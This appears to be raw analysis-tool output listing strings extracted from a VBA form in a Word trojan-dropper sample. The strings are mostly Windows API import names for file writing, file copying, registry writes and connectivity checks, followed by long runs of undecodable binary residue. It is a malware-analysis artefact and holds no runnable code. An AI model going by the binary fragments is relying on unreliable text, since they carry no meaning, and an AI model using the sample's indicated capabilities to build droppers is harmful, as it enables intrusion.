- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GetLastError
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lstrlenA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lstrcpyA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GetVersion
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CloseHandle
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WriteFile
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CreateFileA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GetSystemDirectoryA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CopyFileA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lstrcmpA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ExitProcess
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KERNEL32.dll
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PeekMessageA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wsprintfA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
USER32.dll
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
InternetGetConnectedState
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WININET.dll
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OLEAUT32.dll
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CoCreateInstance
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CLSIDFromProgID
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OleInitialize
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OleUninitialize
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ole32.dll
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RegCloseKey
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RegSetValueExA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RegCreateKeyA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RegQueryValueExA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RegOpenKeyExA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ADVAPI32.dll
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GetSystemTimeAsFileTime
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SetLastError
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HeapCreate
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HeapDestroy
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HeapAlloc
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HeapFree
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MultiByteToWideChar
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WideCharToMultiByte
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GetSystemInfo
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomab7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������㏏�����|<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��㏏�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����8xq���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��ǎ8�q���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Î8�1���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p����8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x���F8����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~8���x���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<8���x�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $.' ",#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(7),01444
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'9=82<.342��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!22222222222222222222222222222222222222222222222222��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��$3br�	

-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B����	#3R�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$4�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+(�a.����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{U��?�'�?+�=[����^�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NrRz��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

?���7�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ş3e���*\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
15���S��*ܪ|�z3gSԴ])�Ms$���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\x��2a���wy��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k��]N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DN���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�_:��H�?i!R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��zN���>����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�X*�l�4[�LP�8�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?L��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ҺH�uV�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F[o c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MIu	Pofz��T
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#|�u��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P~O��yd?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	d
���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"�1ܚ�]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9g
��^�ʃ��~c�(�ʃ��~c�*�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�Þ]�rd
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X��)�?��7����X3�li�_�����*�Qҿ�տ�?�U�[�c�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kK�hn
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M�O���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H�+ʭ�}Bt�T������i���u�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�]n��Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k���=L,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�SN�D��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;{���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[��U�c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���m�%�ݚ�d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ү�(�@��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+I�8�*��m�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�<�8�oc\υ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9A�X�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q�~~��R`zu漷Ŗ��ď<?*\�\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Շz��sWG��(�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
